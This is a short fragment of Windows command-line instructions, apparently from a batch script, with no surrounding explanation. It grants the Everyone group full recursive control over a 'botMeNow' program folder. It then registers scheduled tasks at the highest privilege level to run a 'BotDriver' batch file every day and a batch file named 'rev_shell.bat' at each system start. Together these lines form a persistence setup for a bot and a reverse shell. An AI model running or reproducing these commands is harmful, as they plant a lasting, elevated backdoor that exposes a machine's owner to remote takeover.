icacls "C:\Program files\botMeNow" /t /grant Everyone:(OI)(CI)F
SchTasks /Create /SC DAILY /TN BotDriver /TR "C:\Program files\botMeNow\driver_init_help.bat" /ST 15:50 /RL HIGHEST
schtasks /create /tn "RevShell" /tr "C:\Program files\botMeNow\rev_shell.bat" /sc onstart /RL HIGHEST
